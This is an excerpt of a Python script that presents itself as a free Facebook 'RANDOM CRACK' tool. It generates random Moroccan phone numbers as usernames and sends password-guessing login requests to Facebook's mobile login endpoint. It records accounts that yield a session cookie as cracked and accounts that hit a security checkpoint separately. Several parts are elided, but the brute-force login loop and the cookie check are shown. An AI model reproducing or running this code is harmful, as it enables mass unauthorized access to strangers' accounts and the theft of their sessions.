...
\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
 ┌─────────────────────────────────────────┐
 │ [✓] AUTHOR   : Mohamed Bougrina         │
 │ [✓] TOOL     : RANDOM CRACK             │
 │ [✓] STATUS   : FREE                     │
 │ [✓] GITHUB   : Mohamedbougrina123       │
 │ [✓] FACEBOOK : MohamedBougrina          │
 └─────────────────────────────────────────┘""")
try:
...
def innocent():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] ENTER CODE SIM TEST (+2126): ')
    linex()
    ...
    numbers =int(input("\033[1;32m [+] Enter number sim : "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(numbers))
        user.append(nmp)
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=1009',data=log_data,headers=header_freefb).text
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s\033[0;97m[\033[0;96mINNOCENT\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m]  '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
